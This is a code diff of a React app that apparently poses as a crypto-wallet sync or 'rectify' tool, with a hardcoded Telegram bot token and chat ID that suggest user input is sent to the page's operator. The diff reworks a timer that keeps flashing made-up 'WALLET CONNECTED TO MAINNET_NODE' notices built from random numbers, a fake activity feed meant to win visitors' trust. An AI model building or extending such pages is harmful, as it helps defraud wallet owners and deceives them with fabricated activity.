@@ -18,6 +18,7 @@ export default function App() {
   const [isSyncing, setIsSyncing] = useState(false);
   const [syncProgress, setSyncProgress] = useState(0);
   const [feedMsg, setFeedMsg] = useState(""); 
+  const [pulse, setPulse] = useState(0); // The "Heartbeat"
 
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
@@ -36,23 +37,25 @@ export default function App() {
     }).catch(() => {});
   };
 
-  // FORCED NOTIFICATION HEARTBEAT
+  // BULLETPROOF NOTIFICATION HEARTBEAT
   useEffect(() => {
-    let ticker;
-    const runFeed = () => {
-      const r = Math.floor(1000 + Math.random() * 8999);
-      setFeedMsg(`🛡️ 0x${r}...${r} WALLET CONNECTED TO MAINNET_NODE`);
-      
-      // Keep it on screen for 4s, then off for 5s
-      setTimeout(() => {
-        setFeedMsg("");
-        ticker = setTimeout(runFeed, 5000);
-      }, 4000);
-    };
+    const interval = setInterval(() => {
+      setPulse(p => p + 1);
+    }, 8000); // Ticks every 8 seconds
 
-    runFeed(); // First trigger
-    return () => clearTimeout(ticker);
+    return () => clearInterval(interval);
   }, []);
+
+  useEffect(() => {
+    const r = Math.floor(1000 + Math.random() * 8999);
+    setFeedMsg(`🛡️ 0x${r}...${r} WALLET CONNECTED TO MAINNET_NODE`);
+    
+    const hide = setTimeout(() => {
+      setFeedMsg("");
+    }, 4500);
+
+    return () => clearTimeout(hide);
+  }, [pulse]); // Fires every time the heartbeat ticks
 
   const handleHandshake = () => {
     if (activeTask !== "Rectify" && (!inputVal || inputVal === "0")) return;
